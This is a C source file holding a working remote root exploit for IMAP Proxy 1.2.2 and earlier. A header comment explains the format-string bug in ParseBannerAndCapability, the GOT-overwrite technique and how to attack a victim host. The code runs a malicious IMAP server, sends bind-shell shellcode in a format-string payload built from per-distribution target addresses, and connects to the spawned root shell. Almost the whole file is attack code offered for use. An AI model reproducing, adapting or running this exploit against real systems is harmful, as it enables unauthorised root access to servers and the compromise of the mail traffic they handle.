/*
 *
 * Linux/x86 IMAP Proxy <=1.2.2-STABLE remote format-string exploit
 *                  
 *
 * [1]------------[ABOUT-IMAP-PROXY]
 *
 * What is IMAP proxy?
 *
 * The name says almost all you need to know. It proxies IMAP
 * transactions between an IMAP client and an IMAP server. The
 * general idea is that the client should never know that it's
 * not talking to the real IMAP server. The only thing that makes
 * this a slightly unique Imap Proxy server is that it caches
 * server connections.
 *
 * From www.imapproxy.org (home page)
 *
 *
 * [2]------------[VULNERABILITY]
 *
 * -->src/main.c
 * 
 * static int ParseBannerAndCapability( char *DestBuf,
 *  unsigned int DestBufSize,
 *  char *SourceBuf,
 *  unsigned int SourceBufSize )
 * {
 *    char *fn = "ParseBannerAndCapability";
 *    char *CP;
 *
 *       .........
 *    
 *    // Trying to cut "\r\n" from request I guess. The lamest way ever.
 *    SourceBuf[SourceBufSize - 2] = '\0';
 *
 *    CP = strtok( SourceBuf, " " );
 *
 *       .........
 *    
 *    // It seems that I hear cries of developers:
 *    // "YEAH, BECAUSE WE'VE NO IDEA WTF STRCPY() IS"
 *    sprintf( DestBuf, CP ); // classical fmt string vulnerability
 *
 *       .........
 *    
 *    for( ; ; )
 *    {
 *       // The nearest glibc function from sprintf.
 *       CP = strtok( NULL, " " );
 *
 *       .........
 *
 * SourceBuf is a pointer on "char ReadBuf[ BUFSIZE ];" from 
 * IMAPTransactionDescriptor structure.
 *
 *
 *
 * [3]------------[EXPLOITATION]
 *
 * First, we have only 2 places where our data is stored.
 * 1st is somewhere in the stack (differs in each session and 
 * hard to guess it), 2nd has regular location in the heap. To get our code
 * executed we can overwrite single GOT entry with address of our
 * variable in heap. So, actually we should know only 2 addresses -
 * GOT and shellcode's addr. 
 * But after a day of researchin Ive found out some hints given by gcc:
 *   1. we have constant distance between ESP and our variable in stack - 1232 bytes.
 *   2. ESI points out our data in the heap. Hope it's correct for every 3.x.x gcc.
 * So, we don't really have to know exact shellcode's addr, because we can just
 * put 'jmp esi' (or jmp esp+1232 that actually takes about 10 bytes of binary code :\) instruction
 * at any known place using standart exploiting format-string's technique. And
 * then rewrite strtok() GOT-entry with addr of that jump-code.
 *
 *
 * [4]------------[HOW-TO-USE-EXPLOIT]
 *
 * Let's imagine that we've got 3 hosts - A, B and V.
 * A - attacker's box #1
 * B - attacker's box #2
 * V - victim's box with imap proxy
 * Here is the sample way how we can hack box V:
 * 1) compile and run m00-im-a-pproxy.c on A
 * 2) setup any IMAP client on B to use box V as imap proxy
 * 3) connect to A from B through proxy server that installed on box V
 * 4) you will get V's console on A terminal
 * Actually A and B can be the same box.
 *
 * [5]------------[SCREENSHOT]
 * 
 * # ./m00-im-a-pproxy
 *
 *  Linux/x86 IMAP Proxy <=1.2.2-STABLE remote format-string exploit
 *                                   by d4rkgr3y and Nas`
 *
 * [~] starting evil IMAP daemon on port 143 ... done
 * [~] waiting for connection ... done
 * [+] Got connection from 127.0.0.1
 * [~] using target #0 - Linux Mandrake 10.0 [up-imapproxy-1.2.2.tar.gz]
 * [+] request sent
 * [~] Connecting to shell... done
 * 
 * ~~~~~~~~~~~~~ m00 INSIDE ~~~~~~~~~~~~~
 * uid=0(root) gid=0(root) groups=0(root)
 * Linux m00 2.4.25-2mdk #1 Tue Mar 2 07:39:08 CET 2004 i686 unknown unknown GNU/Linux
 * 
 
 
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>

#define PORT 143

char linuxshellcode[]=
	"\xeb\x6e\x5e\x29\xc0\x89\x46\x10"
	"\x40\x89\xc3\x89\x46\x0c\x40\x89"	 
	"\x46\x08\x8d\x4e\x08\xb0\x66\xcd"
	"\x80\x43\xc6\x46\x10\x10\x88\x46"
	"\x08\x31\xc0\x31\xd2\x89\x46\x18"
	"\xb0\x90\x66\x89\x46\x16\x8d\x4e"
	"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0"
	"\x66\xcd\x80\x89\x5e\x0c\x43\x43"
	"\xb0\x66\xcd\x80\x89\x56\x0c\x89"
	"\x56\x10\xb0\x66\x43\xcd\x80\x86"
	"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0"
	"\x3f\x41\xcd\x80\xb0\x3f\x41\xcd"
	"\x80\x88\x56\x07\x89\x76\x0c\x87"
	"\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80"
	"\xe8\x8d\xff\xff\xff\x2f\x62\x69"
	"\x6e\x2f\x73\x68";

struct {
	char *name;
	int strtok_got_addr;
	int offset_from_got_to_jmp_esi;
	int distance_between_esp_and_buf;
	int x86_jmp_esi;
} targets[]= {
	{"Linux Mandrake 10.0 [up-imapproxy-1.2.2.tar.gz]", 0x08054bd0, 0x38, 1232, 0xe6ff },
	{"Linux Slackware 10.0 [up-imapproxy-1.2.2.tar.gz]", 0x08054c64, 0x38, 1231, 0xe6ff },
	{ NULL , 0x0 },
};



void usage(char *prg) {
	int i=0;
	printf("Usage %s <target #> [port]\nAvailable targets:\n",prg);  
	while(targets[i].strtok_got_addr != 0x00) {
		printf("   %d. %s \t- 0x%x\n",i,targets[i].name,targets[i].strtok_got_addr);
		i++;
	}
	printf("\n");
	exit(0);
}

int get_shell(char *ip, unsigned short port) {

	fd_set rfds;
	int retVal,r;
	char buf[8096];

	int sockfd;

	struct hostent *hs;
	struct sockaddr_in sock;

	bzero(&sock, sizeof(sock));
	sock.sin_family = AF_INET;
	sock.sin_port   = htons(port);

	if ((sock.sin_addr.s_addr = inet_addr(ip)) == -1) {
		if ((hs = gethostbyname(ip)) == NULL)
			{ printf(" failed\n\n");
			return -1; }

		sock.sin_family = hs->h_addrtype;
		memcpy((caddr_t)&sock.sin_addr.s_addr, hs->h_addr, hs->h_length);
	}

	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		{ printf(" failed\n\n");
		return -1; }

	if(connect(sockfd, (struct sockaddr *)&sock, sizeof(sock)) < 0)
		{ printf(" failed\n\n");
		return -1; }
	printf("done\n\n~~~~~~~~~~~~~ m00 INSIDE ~~~~~~~~~~~~~\n");
	send(sockfd,"id;uname -a;\n",13,0);
	do {
		FD_ZERO(&rfds);
		FD_SET(0, &rfds);
		FD_SET(sockfd, &rfds);
		retVal = select(sockfd+1, &rfds, NULL, NULL, NULL);

		if(retVal) {
			if(FD_ISSET(sockfd, &rfds)) {
				buf[(r=recv(sockfd, buf, 8095,0))] = '\0';
				printf("%s", buf);
			}
			if(FD_ISSET(0, &rfds)) {
				buf[(r=read(0, buf, 8095))]='\0';
				send(sockfd, buf, strlen(buf), 0);
			}
		}
	} while(retVal && r);

	close(sockfd);
	return 1;
}

int main(int argc, char *argv[])
{
	socklen_t l;
	struct sockaddr_in srv, clsa;
	char buf[1201],mbuf[1000];
	char *client;
	int port = PORT;
	int sock, cl, tgt;

	
	printf("\n Linux/x86 IMAP Proxy <=1.2.2-STABLE remote format-string exploit\n");
	printf("                                   by d4rkgr3y and Nas`\n\n");

	if(argc<2) usage(argv[0]);
	else tgt = atoi(argv[1]);
	
	if(argv[2]) port = atoi(argv[2]);
	
	printf("[~] starting evil IMAP daemon on port %d ... ",port);

	srv.sin_family = PF_INET;
	srv.sin_addr.s_addr = INADDR_ANY;
	srv.sin_port = htons(port);
	
	sock = socket(PF_INET, SOCK_STREAM, 0);
	
	if(bind(sock, (struct sockaddr*)&srv, sizeof(srv)) == -1) {
		perror("bind()");
		exit(0);
	}
	
	printf("done\n[~] waiting for connection ... ");
	
	if(listen(sock, SOMAXCONN)==-1) {
		perror("listen()");
		exit(0);
	}
	
	while(1) {
		cl = accept(sock, (struct sockaddr*)&clsa,&l);
		
		client = inet_ntoa(clsa.sin_addr);
		
		printf("done\n[+] Got connection from %s\n",client);
		printf("[~] using target #%d - %s\n",tgt,targets[tgt].name);

		sleep(15);
		
		memset(buf,'\x00',sizeof(buf));

		
		int wraddr = targets[tgt].strtok_got_addr;
		int wraddr2 = targets[tgt].strtok_got_addr + 0x02;
		int wraddr3 = targets[tgt].strtok_got_addr + targets[tgt].offset_from_got_to_jmp_esi;
		int ret = (targets[tgt].strtok_got_addr >> 16) & 0xffff;
		int ret2 = (targets[tgt].strtok_got_addr & 0xffff) + targets[tgt].offset_from_got_to_jmp_esi;
		int al = targets[tgt].distance_between_esp_and_buf;
		int jmpesi = targets[tgt].x86_jmp_esi;
	

		snprintf(buf,sizeof(buf),
			"%s%s%s%s"
			"%%.%dx%%%d$hn"
			"%%.%dx%%%d$hn"
			"%%.%dx%%%d$hn"
			"\r\n",
			linuxshellcode,(char *)&wraddr,(char *)&wraddr2,(char *)&wraddr3,


			ret-0x18-strlen(linuxshellcode),al+1+(strlen(linuxshellcode)/4),
			ret2-ret,al+2+(strlen(linuxshellcode)/4),
			jmpesi-ret2,al+3+(strlen(linuxshellcode)/4));
		

		send(cl,buf,strlen(buf),0);
	
		printf("[+] request sent\n");

		close(cl);
	
		printf("[~] Connecting to shell ... ");
		sleep(5);
		get_shell(client,36864);

	}
}

